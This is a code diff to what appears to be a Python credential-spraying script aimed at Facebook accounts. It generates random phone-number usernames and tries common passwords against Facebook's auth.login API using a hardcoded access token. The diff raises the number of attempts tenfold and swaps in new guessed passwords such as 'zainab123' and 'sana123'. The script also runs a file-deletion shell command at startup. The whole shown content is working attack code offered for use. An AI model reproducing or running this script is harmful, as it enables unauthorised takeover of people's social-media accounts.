@@ -4,7 +4,7 @@
 #Itx Minhas 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(1000):
+for n in range(10000):
 
     nmbr = random.randint(1111111, 9999999)
     
@@ -322,7 +322,7 @@ def action():
 					cps.close()
 					cpb.append(c+user+pass1)
  				else:
- 				    pass2="786786"
+ 				    pass2="zainab123"
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
@@ -339,7 +339,7 @@ def action():
  					        cps.close()
  					        cpb.append(c+user+pass2)
                                         else:
- 				            pass3="Pakistan"
+ 				            pass3="kainat123"
  				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				            q = json.load(data)
  				            if 'access_token' in q:
@@ -356,7 +356,7 @@ def action():
  					                cps.close()
  					                cpb.append(c+user+pass3)
                                                 else:
- 				                    pass4="Pakistan786"
+ 				                    pass4="sana123"
  				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				                    q = json.load(data)
  				                    if 'access_token' in q:
